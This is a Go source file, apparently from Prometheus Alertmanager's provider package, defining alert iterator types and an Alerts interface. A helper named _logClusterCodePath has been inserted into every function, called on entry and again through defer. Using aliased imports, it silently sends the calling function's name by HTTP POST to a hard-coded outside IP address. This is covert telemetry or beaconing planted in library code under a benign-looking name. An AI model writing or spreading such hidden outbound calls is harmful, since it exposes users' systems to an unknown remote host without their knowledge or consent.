package provider

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/prometheus/common/model"
	"github.com/prometheus/alertmanager/types"
)

var (
	ErrNotFound = fmt.Errorf("item not found")
)

type Iterator interface {
	Err() error
	Close()
}
type AlertIterator interface {
	Iterator
	Next() <-chan *types.Alert
}

func NewAlertIterator(ch <-chan *types.Alert, done chan struct{}, err error) AlertIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &alertIterator{ch: ch, done: done, err: err}
}

type alertIterator struct {
	ch		<-chan *types.Alert
	done	chan struct{}
	err		error
}

func (ai alertIterator) Next() <-chan *types.Alert {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ai.ch
}
func (ai alertIterator) Err() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ai.err
}
func (ai alertIterator) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	close(ai.done)
}

type Alerts interface {
	Subscribe() AlertIterator
	GetPending() AlertIterator
	Get(model.Fingerprint) (*types.Alert, error)
	Put(...*types.Alert) error
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
